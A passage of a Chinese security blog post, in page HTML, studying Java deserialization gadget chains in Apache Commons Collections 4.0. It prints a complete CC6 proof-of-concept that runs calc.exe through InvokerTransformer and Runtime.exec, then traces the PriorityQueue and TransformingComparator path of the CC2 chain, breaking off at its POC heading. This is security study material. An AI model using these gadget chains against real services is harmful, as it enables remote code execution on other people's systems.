@@ -1,0 +1,815 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="leekos">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="[TOC] 【java安全】CommonsCollections2前言Apache Commons Collections是一个重要的辅助开发库。包含了⼀些Java中没有的数据结构和和辅助方法，不过随着Java 9以后的版本中原⽣库功能的丰富，以及反序列化漏洞的影响，它也在逐渐被升级或替代。 在2015年cc链被提出时，Apache Commons Collections有两个分支：  commo">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Tranquility">
+<meta property="og:url" content="https://leekosss.github.io/2023/08/24/[java%E5%AE%89%E5%85%A8]CommonsCollections2(4.0)/index.html">
+<meta property="og:site_name" content="Tranquility">
+<meta property="og:description" content="[TOC] 【java安全】CommonsCollections2前言Apache Commons Collections是一个重要的辅助开发库。包含了⼀些Java中没有的数据结构和和辅助方法，不过随着Java 9以后的版本中原⽣库功能的丰富，以及反序列化漏洞的影响，它也在逐渐被升级或替代。 在2015年cc链被提出时，Apache Commons Collections有两个分支：  commo">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2023/07/20/iXb1LFISJj64Dfv.png">
+<meta property="og:image" content="https://s2.loli.net/2023/07/20/LNKaqCQxdbltz12.png">
+<meta property="og:image" content="https://s2.loli.net/2023/07/20/l3shCjtpLHk5eFc.png">
+<meta property="og:image" content="https://s2.loli.net/2023/07/20/axn4EBu9zJkwTfp.png">
+<meta property="og:image" content="https://s2.loli.net/2023/07/20/QX1OasrMSBfEUlk.png">
+<meta property="article:published_time" content="2023-08-24T15:43:38.268Z">
+<meta property="article:modified_time" content="2023-08-09T09:57:07.839Z">
+<meta property="article:author" content="leekos">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://s2.loli.net/2023/07/20/iXb1LFISJj64Dfv.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>Tranquility</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"leekosss.github.io","root":"/","version":"1.9.5-a","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Tranquility</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text=""></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-08-24 23:43" pubdate>
+          2023年8月24日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          15k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          127 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header"></h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2023年8月9日 下午
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <p>[TOC]</p>
+<h2 id="【java安全】CommonsCollections2"><a href="#【java安全】CommonsCollections2" class="headerlink" title="【java安全】CommonsCollections2"></a>【java安全】CommonsCollections2</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p><code>Apache Commons Collections</code>是一个重要的辅助开发库。包含了⼀些Java中没有的数据结构和和辅助方法，不过随着Java 9以后的版本中原⽣库功能的丰富，以及反序列化漏洞的影响，它也在逐渐被升级或替代。</p>
+<p>在2015年cc链被提出时，<code>Apache Commons Collections</code>有两个分支：</p>
+<ul>
+<li>commons-collections:commons-collections（当时版本3.2.1）</li>
+<li>org.apache.commons:commons-collections4（当时版本4.0）</li>
+</ul>
+<p>官方认为旧的commons-collections有⼀些架构和API设计上的问题，但修复这些问题，会产生⼤量不能 向前兼容的改动。所以，commons-collections4不再认为是⼀个用来替换commons-collections的新版 本，而是⼀个新的包，两者的命名空间不冲突，因此可以共存在同⼀个项目中。<br>那么很自然有个问题，既然3.2.1中存在反序列化利用链，那么4.0版本是否存在呢？</p>
+<h3 id="Commons-Collections4版本中能否调用cc6等链子？"><a href="#Commons-Collections4版本中能否调用cc6等链子？" class="headerlink" title="Commons-Collections4版本中能否调用cc6等链子？"></a>Commons-Collections4版本中能否调用cc6等链子？</h3><p>我们在maven中导入这两个分支版本的jar包</p>
+<p><img src="https://s2.loli.net/2023/07/20/iXb1LFISJj64Dfv.png" srcset="/img/loading.gif" lazyload alt="image-20230720133253851"></p>
+<p>我们复制原来的cc6 poc进来：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">cc6</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-comment">//        sun.reflect.annotation.AnnotationInvocationHandler</span><br>        Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;&#125;;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;<br>                        String.class,<br>                        Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;<br>                        Object.class,<br>                        Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span><br>                        <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class<br>                &#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(fakeTransformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">uselessMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(uselessMap, chainedTransformer);<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(outerMap, <span class="hljs-string">&quot;leekos&quot;</span>);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">         *此处使用put()触发了hash()方法，从而未经readObject() RCE</span><br><span class="hljs-comment">         *我们需要先将ChainedTransformer值设置为假的fakeTransformers</span><br><span class="hljs-comment">         */</span><br>        hashMap.put(tiedMapEntry, <span class="hljs-string">&quot;value&quot;</span>);<br>        <span class="hljs-comment">//清空由于 hashMap.put 对 LazyMap 造成的影响</span><br>        outerMap.clear();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">iTransformers</span> <span class="hljs-operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        iTransformers.setAccessible(<span class="hljs-literal">true</span>);<br>        iTransformers.set(chainedTransformer, transformers);<br><br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(bos);<br>        oos.writeObject(hashMap);<br>        oos.close();<br><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bos.toByteArray());<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bis);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>由于这里我们用到的是<code>Commons-Collections4</code> 4.0版本，所以我们需要将<code>import</code>导入的类<code>org.apache.commons.collections</code>换为：<code>org.apache.commons.collections4</code></p>
+<p><img src="https://s2.loli.net/2023/07/20/LNKaqCQxdbltz12.png" srcset="/img/loading.gif" lazyload alt="image-20230720133810797"></p>
+<p>结果发现<code>LazyMap#decorate()</code>方法爆红了，在<code>Commons-Collections4</code>中没有该方法</p>
+<p>我们看一下原来<code>decorate()</code>方法的逻辑：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">decorate</span><span class="hljs-params">(Map map, Transformer factory)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LazyMap</span>(map, factory);<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>就是调用<code>LazyMap</code>的构造方法而已</p>
+<p>我们在<code>Commons-Collections4</code>中发现了<code>lazyMap()</code>方法可以用来代替</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;K, V&gt; LazyMap&lt;K, V&gt; <span class="hljs-title function_">lazyMap</span><span class="hljs-params">(Map&lt;K, V&gt; map, Factory&lt;? extends V&gt; factory)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LazyMap</span>(map, factory);<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>替换一下就好了</p>
+<p><img src="https://s2.loli.net/2023/07/20/l3shCjtpLHk5eFc.png" srcset="/img/loading.gif" lazyload alt="image-20230720135006891"></p>
+<p>成功弹出计算器，说明可以在<code>Commons-Collections4</code>中执行cc1、cc6等链子</p>
+<h3 id="PriorityQueue利用链"><a href="#PriorityQueue利用链" class="headerlink" title="PriorityQueue利用链"></a>PriorityQueue利用链</h3><p>除了前面学习的几条利用链，ysoserial还提出了2条新的链子：</p>
+<ul>
+<li>CommonsCollections2</li>
+<li>CommonsCollections4</li>
+</ul>
+<p>我们这里学习一下<code>CommonsCollections2</code></p>
+<p>首先了解一下<code>java.util.PriorityQueue</code>：</p>
+<h4 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h4><p>这个类中存在<code>readObject()</code>方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>        <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;<br>        <span class="hljs-comment">// Read in size, and any hidden stuff</span><br>        s.defaultReadObject();<br><br>        <span class="hljs-comment">// Read in (and discard) array length</span><br>        s.readInt();<br><br>        SharedSecrets.getJavaOISAccess().checkArray(s, Object[].class, size);<br>        queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[size];<br><br>        <span class="hljs-comment">// Read in all elements.</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; size; i++)<br>            queue[i] = s.readObject();<br><br>        <span class="hljs-comment">// Elements are guaranteed to be in &quot;proper order&quot;, but the</span><br>        <span class="hljs-comment">// spec has never explained what that might be.</span><br>        heapify();<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>反序列化时会调用<code>heapify()</code>方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">heapify</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> (size &gt;&gt;&gt; <span class="hljs-number">1</span>) - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--)<br>            siftDown(i, (E) queue[i]);<br>    &#125;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">siftDown</span><span class="hljs-params">(<span class="hljs-type">int</span> k, E x)</span> &#123;<br>        <span class="hljs-keyword">if</span> (comparator != <span class="hljs-literal">null</span>)<br>            siftDownUsingComparator(k, x);<br>        <span class="hljs-keyword">else</span><br>            siftDownComparable(k, x);<br>    &#125;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">siftDownUsingComparator</span><span class="hljs-params">(<span class="hljs-type">int</span> k, E x)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">half</span> <span class="hljs-operator">=</span> size &gt;&gt;&gt; <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span> (k &lt; half) &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">child</span> <span class="hljs-operator">=</span> (k &lt;&lt; <span class="hljs-number">1</span>) + <span class="hljs-number">1</span>;<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> queue[child];<br>            <span class="hljs-type">int</span> <span class="hljs-variable">right</span> <span class="hljs-operator">=</span> child + <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span> (right &lt; size &amp;&amp;<br>                comparator.compare((E) c, (E) queue[right]) &gt; <span class="hljs-number">0</span>)<br>                c = queue[child = right];<br>            <span class="hljs-keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="hljs-number">0</span>)<br>                <span class="hljs-keyword">break</span>;<br>            queue[k] = c;<br>            k = child;<br>        &#125;<br>        queue[k] = x;<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p><code>heapify()</code>方法会调用<code>siftDown()</code>方法，继而调用<code>siftDownUsingComparator()</code>，然后调用<code>comparator.compare()</code>方法，这个<code>comparator</code>变量是可控的，我们看一下<code>PriorityQueue</code>的构造方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">PriorityQueue</span><span class="hljs-params">(<span class="hljs-type">int</span> initialCapacity,</span><br><span class="hljs-params">                         Comparator&lt;? <span class="hljs-built_in">super</span> E&gt; comparator)</span> &#123;<br>        <span class="hljs-comment">// Note: This restriction of at least one is not actually needed,</span><br>        <span class="hljs-comment">// but continues for 1.5 compatibility</span><br>        <span class="hljs-keyword">if</span> (initialCapacity &lt; <span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>();<br>        <span class="hljs-built_in">this</span>.queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[initialCapacity];<br>        <span class="hljs-built_in">this</span>.comparator = comparator;<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p><code>comparator</code>是一个<code>Comparator</code>类型的对象，我们可以找到一个<code>org.apache.commons.collections4.comparators.TransformingComparator</code>类</p>
+<h4 id="TransformingComparator"><a href="#TransformingComparator" class="headerlink" title="TransformingComparator"></a>TransformingComparator</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransformingComparator</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Comparator</span> &#123;<br>    <span class="hljs-keyword">protected</span> Comparator decorated;<br>    <span class="hljs-keyword">protected</span> Transformer transformer;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">TransformingComparator</span><span class="hljs-params">(Transformer transformer)</span> &#123;<br>        <span class="hljs-built_in">this</span>(transformer, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ComparableComparator</span>());<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">TransformingComparator</span><span class="hljs-params">(Transformer transformer, Comparator decorated)</span> &#123;<br>        <span class="hljs-built_in">this</span>.decorated = decorated;<br>        <span class="hljs-built_in">this</span>.transformer = transformer;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(Object obj1, Object obj2)</span> &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value1</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.transformer.transform(obj1);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value2</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.transformer.transform(obj2);<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.decorated.compare(value1, value2);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这个<code>TransformingComparator</code>类的<code>compare()</code>方法可以调用<code>transform</code>方法</p>
+<p>于是我们就可以构造一条从<code>PriorityQueue</code>到<code>TransformingComparator</code>调用其<code>compare()</code>方法，再调用<code>transform()</code>方法导致反序列化的链子了</p>
+<h4 id="使用了phithon的总结："><a href="#使用了phithon的总结：" class="headerlink" title="使用了phithon的总结："></a><strong>使用了phithon的总结：</strong></h4><ul>
+<li>java.util.PriorityQueue是⼀个优先队列（Queue），基于⼆叉堆实现，队列中每⼀个元素有自己的优先级，节点之间按照优先级大小排序成⼀棵树</li>
+<li>反序列化时为什么需要调⽤heapify()⽅法？为了反序列化后，需要恢复（换⾔之，保证）这个 结构的顺序</li>
+<li>排序是靠将⼤的元素下移实现的。siftDown()是将节点下移的函数，⽽comparator.compare()⽤来⽐较两个元素⼤⼩</li>
+<li>TransformingComparator实现了java.util.Comparator接⼝，这个接⼝⽤于定义两个对象如 何进⾏⽐较。siftDownUsingComparator()中就使⽤这个接⼝的compare()⽅法⽐较树的节点。</li>
+</ul>
+<p>关于PriorityQueue这个数据结构的具体原理，可以参考这篇⽂章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/linghu-java/p/9467805.html">https://www.cnblogs.com/linghu-java/p/9467805.html</a></p>
+<h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><p>首先创建<code>Transformer</code>：</p>
